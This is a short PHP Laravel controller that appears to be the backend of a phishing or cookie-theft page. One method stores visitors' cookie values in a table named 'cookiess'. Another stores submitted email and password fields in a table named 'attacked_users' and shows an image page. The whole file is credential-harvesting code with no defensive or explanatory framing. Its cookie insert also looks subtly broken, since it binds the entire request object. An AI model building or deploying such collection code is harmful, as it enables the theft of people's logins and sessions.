<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Post;
use Illuminate\Support\Facades\DB;
class HelloController extends Controller
{
    public function index(Request $request){
        if($request->cookie){
        DB::insert('insert into cookiess ( cookie ) values (:cookie)',[$request]);
        }
        $image=Post::all();
        return view('hello', compact('image'));
    }

    public function post(Request $request){
        $image=Post::all();
        $param =[
            'name' => $request ->name,
            'pass' => $request ->pass,
        ];
        DB::insert('insert into attacked_users ( email , password ) values (:name,:pass)',$param);
        return view('hello', compact('image'));

    }
}
